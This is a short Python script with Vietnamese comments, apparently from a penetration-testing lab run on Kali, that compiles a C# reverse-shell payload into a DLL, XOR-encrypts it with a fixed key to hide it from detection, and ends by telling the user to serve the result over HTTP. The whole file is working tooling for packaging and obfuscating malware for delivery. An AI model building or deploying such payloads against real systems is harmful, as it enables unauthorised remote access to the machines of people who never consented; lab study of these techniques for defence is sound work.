#!/usr/bin/env python3
# make_payload.py — compile PayloadRevShell.cs → Payload.dll → XOR → payload.bin
# Chạy trên Kali sau khi copy PayloadRevShell.cs sang
import subprocess, os, sys

KEY      = b"lab2026"
CS_FILE  = "PayloadRevShell.cs"
DLL_FILE = "Payload.dll"
BIN_FILE = "payload.bin"

# Bước 1: compile .cs → .dll bằng mcs (Mono C# compiler trên Kali)
print("[*] Compiling PayloadRevShell.cs ...")
result = subprocess.run(
    ["mcs", "-target:library", "-out:" + DLL_FILE, CS_FILE],
    capture_output=True, text=True
)
if result.returncode != 0:
    print("[!] Compile failed:")
    print(result.stderr)
    sys.exit(1)
print("[+] Compiled → " + DLL_FILE)

# Bước 2: XOR encrypt Payload.dll → payload.bin
print("[*] XOR encrypting with key: " + KEY.decode())
with open(DLL_FILE, "rb") as f:
    data = f.read()

enc = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

with open(BIN_FILE, "wb") as f:
    f.write(enc)

print("[+] Created → " + BIN_FILE + " (" + str(len(enc)) + " bytes)")
print("[+] Done! Serve với: python3 -m http.server 8000")
